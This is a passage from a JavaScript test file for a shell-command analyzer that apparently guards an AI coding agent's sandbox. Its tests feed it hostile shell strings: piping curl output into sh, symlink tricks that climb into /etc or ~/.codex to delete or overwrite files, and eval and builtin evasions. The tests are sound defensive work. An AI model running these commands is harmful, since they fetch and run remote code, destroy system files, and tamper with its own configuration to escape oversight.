      const [k, ...v] = argv[i].split('=');
      env[k] = v.join('=');
    }
    return { argv: argv.slice(i), env };
  };
  // ahead of the built-in wrapper step: this exercises the mechanism with steps that do not mark
  // their layer external (a real `nice cd` runs in a new process and moves nothing)
  PRE_STEPS.unshift(nice, envStep);
  try {
    let cs = cmds('nice rm x', here);
    assert.deepEqual(cs[0].argv, ['rm', 'x']);
    assert.deepEqual(cs[0].ops, [{ path: path.join(here, 'x'), op: 'delete' }]);
    cs = cmds(`env GIT_DIR=${there}/.git git commit`, here);
    assert.deepEqual(cs[0].repo, { root: here, branch: 'main' });
    assert.equal(cs[0].env.GIT_DIR, `${there}/.git`);
    cs = cmds('nice mv a b; cat b', here);
    assert.deepEqual(cs[1].argv, ['cat', UNKNOWN]);
    fs.mkdirSync(path.join(here, 'sub'), { recursive: true });
    assert.equal(cmds('nice cd sub && rm f', here).at(-1).cwd, path.join(here, 'sub'));
    assert.equal(opaque('curl -s example.com | nice env A=1 sh').construct, 'stdin-interpreter');
  } finally {
    PRE_STEPS.splice(PRE_STEPS.indexOf(nice), 1);
    PRE_STEPS.splice(PRE_STEPS.indexOf(envStep), 1);
  }
});

test('assignments in arithmetic count for the loop scan', () => {
  const cs = cmds('x=d; while true; do rm -f "$x"; echo $((x=1)); done');
  assert.deepEqual(byProgram(cs, 'rm')[0].argv, ['rm', '-f', UNKNOWN]);
});

test('opsOf: any chmod cluster containing R is recursive', () => {
  assert.deepEqual(opsOf(['chmod', '-Rw', 'dir']), [{ path: 'dir', op: 'chmod' }]);
  assert.deepEqual(opsOf(['chmod', '-wR', 'dir']), [{ path: 'dir', op: 'chmod' }]);
  assert.deepEqual(opsOf(['chmod', '-RH', '755', 'dir']), [{ path: 'dir', op: 'chmod' }]);
  assert.deepEqual(opsOf(['chmod', '-w', 'dir']), []);
});

// ---- fix round 2 ---------------------------------------------------------------------------------

test('taint: a prefix before .. is resolved, so a path through another symlink is caught', () => {
  const d = dir();
  const real = path.join(d, 'real');
  fs.mkdirSync(real);
  fs.symlinkSync(real, path.join(d, 'alias')); // like macOS /tmp -> /private/tmp
  const alias = path.join(d, 'alias');
  let cs = cmds(`ln -s /etc ${real}/dq; rm -f ${alias}/dq/../hosts`, d);
  assert.deepEqual(cs[1].argv, ['rm', '-f', UNKNOWN]);
  assert.deepEqual(cs[1].ops, [{ path: UNKNOWN, op: 'delete' }]);
  // the exploitable form: the link points into a protected tree, `..` climbs inside it
  cs = cmds(`ln -s ${HOME}/.codex/sub ${real}/d; rm -rf ${alias}/d/../config; echo x > ${alias}/d/../c2`, d);
  assert.deepEqual(cs[1].ops, [{ path: UNKNOWN, op: 'delete' }]);
  assert.deepEqual(cs[2].writes, [UNKNOWN]);
  // the real macOS /tmp case, when /tmp is a symlink on this machine (nothing is written)
  let tmpReal = null;
  try {
    tmpReal = fs.realpathSync('/tmp');
  } catch {
    tmpReal = null;
  }
  if (tmpReal && tmpReal !== '/tmp') {
    cs = cmds(`ln -s /etc ${tmpReal}/dq-fence-test; rm -f /tmp/dq-fence-test/../hosts`, d);
    assert.deepEqual(cs[1].ops, [{ path: UNKNOWN, op: 'delete' }]);
  }
  // an untainted path with .. still resolves
  assert.deepEqual(cmds(`ln -s a b; rm -f ${real}/../zz`, d)[1].ops, [{ path: path.join(d, 'zz'), op: 'delete' }]);
});

test('chains of builtin/command (with -p, --) are stripped before cd and eval/source/. detection', () => {
  const d = makeRepo();
  fs.mkdirSync(path.join(d, 'sub'));
  const sub = path.join(d, 'sub');
  for (const c of ['builtin builtin cd sub', 'command -p cd sub', 'command -- cd sub', 'builtin command cd sub']) {
    assert.equal(cmds(`${c}; rm f`, d).at(-1).cwd, sub, c);
  }
  for (const c of ['builtin eval cd sub', 'command . ./x', 'command -p source x', 'builtin builtin eval true']) {
    const cs = cmds(`${c}; rm f; git commit`, d);
    assert.equal(cs.at(-2).cwd, UNKNOWN, c);
    assert.equal(cs.at(-1).repo, UNKNOWN, c);
  }
  // command -v only prints
  assert.equal(cmds('command -v cd; rm f', d).at(-1).cwd, d);
});

test('a stdin-feeding exec that may have happened stays in effect (subshells excepted)', () => {
  for (const t of [
    'if true; then exec < f; fi; sh',
    'false || exec < f; sh',
    'true && exec < f; sh',
    'case x in x) exec < f;; esac; sh',
    'for i in 1; do exec < f; done; sh',
    'echo | exec < f; sh',
  ]) {
    assert.equal(opaque(t).construct, 'stdin-interpreter', t);
  }
  cmds('(exec < f); sh -c true');
  cmds('echo $(exec < f); sh -c true');
});

test('the loop scan applies PRE_STEPS and the eval/source/. rule like the walk', () => {
  const d = dir();
  fs.mkdirSync(path.join(d, 'sub'));
  for (const body of ['builtin cd sub', 'command -p cd sub', 'eval cd sub', '. ./x', 'builtin eval true']) {
    const cs = cmds(`while true; do rm -rf x; ${body}; done`, d);
    assert.equal(byProgram(cs, 'rm')[0].cwd, UNKNOWN, body);
  }
  const nice = ({ argv }) => (argv[0] === 'nice' ? { argv: argv.slice(1) } : null);
  PRE_STEPS.push(nice);
  try {
    const cs = cmds('while true; do rm -rf x; nice cd sub; done', d);
    assert.equal(byProgram(cs, 'rm')[0].cwd, UNKNOWN);
  } finally {
    PRE_STEPS.splice(PRE_STEPS.indexOf(nice), 1);
  }
  // a loop without cd keeps the cwd
  assert.equal(byProgram(cmds('while true; do rm -rf x; nice ls; done', d), 'rm')[0].cwd, d);
  // git in a loop body: an alias may switch branches before the next iteration's commit
  const here = makeRepo();
  assert.equal(cmds('for i in 1 2; do git commit; git co x; done', here)[0].repo.branch, UNKNOWN);
  // eval poisons the env at loop start: GIT_DIR may be exported, so the whole repository is UNKNOWN
  assert.equal(cmds('for i in 1 2; do git commit; builtin eval true; done', here)[0].repo, UNKNOWN);
  assert.deepEqual(cmds('for f in a b; do git add $f; done; git commit', here).at(-1).repo, { root: here, branch: 'feature' });
});

test('a repo lookup from a directory that does not exist yet is UNKNOWN, not null', () => {
  const outside = dir();
  fs.mkdirSync(path.join(outside, 'exists'));
  assert.equal(cmds('cp -r ../r n && cd n && git commit', outside).at(-1).repo, UNKNOWN);
  assert.equal(cmds('git -C nowhere commit', outside)[0].repo, UNKNOWN);
  assert.equal(cmds('cd exists && git commit', outside).at(-1).repo, null);
});

// ---- fix round 3 ---------------------------------------------------------------------------------

test('while an ln/mv taint is active, a word whose resolution follows a symlink is UNKNOWN', () => {
  const d = dir();
  fs.mkdirSync(path.join(d, 'real', 'sub'), { recursive: true });
  // L already exists and points through d, which the command creates
  fs.symlinkSync('d/../config', path.join(d, 'L'));
  let cs = cmds('ln -s real/sub d; echo x > L; rm -rf L/x; cat L', d);
  assert.deepEqual(cs[1].writes, [UNKNOWN]);
  assert.deepEqual(cs[2].ops, [{ path: UNKNOWN, op: 'delete' }]);
  assert.deepEqual(cs[3].argv, ['cat', UNKNOWN]);
  // the exploit shape
  cs = cmds(`ln -s ${HOME}/.codex/sub d; echo pwn > L`, d);
  assert.deepEqual(cs[1].writes, [UNKNOWN]);
  // without an in-command ln/mv the existing link resolves as usual
  assert.deepEqual(cmds('echo x > L', d)[0].writes, [path.join(d, 'config')]);
  // and with one, plain paths that follow no link still resolve
  assert.deepEqual(cmds('ln -s real/sub d; echo x > plain', d)[1].writes, [path.join(d, 'plain')]);
});

test('a non-literal target after builtin/command is opaque, in the walk and the loop scan', () => {
  for (const t of [
    'builtin $(echo cd) sub; rm -rf f',
    'command "$U" sub',
    'command -p -- $(pick) sub',
    'X=cd; while true; do rm -rf x; builtin $X sub; done',
    'for i in 1; do command "$U" sub; done',
  ]) {
    assert.equal(opaque(t).construct, 'command-word', t);
  }
  // -v / -V only print
  cmds('command -v "$U"; command -V $(pick)');
  // a known value is fine outside loops
  const d = dir();
  fs.mkdirSync(path.join(d, 'sub'));
  assert.equal(cmds('X=cd; builtin $X sub; rm f', d).at(-1).cwd, path.join(d, 'sub'));
});

test('a directory an earlier command deletes or moves counts as missing for repo lookups', () => {
  const d = dir();
  fs.mkdirSync(path.join(d, 'sub'));
  assert.equal(cmds('rm -rf sub && cp -r ../r sub && cd sub && git commit', d).at(-1).repo, UNKNOWN);
  assert.equal(cmds('mv sub old && cp -r ../r sub && cd sub && git commit', d).at(-1).repo, UNKNOWN);
  assert.equal(cmds('cd sub && git commit', d).at(-1).repo, null);
});
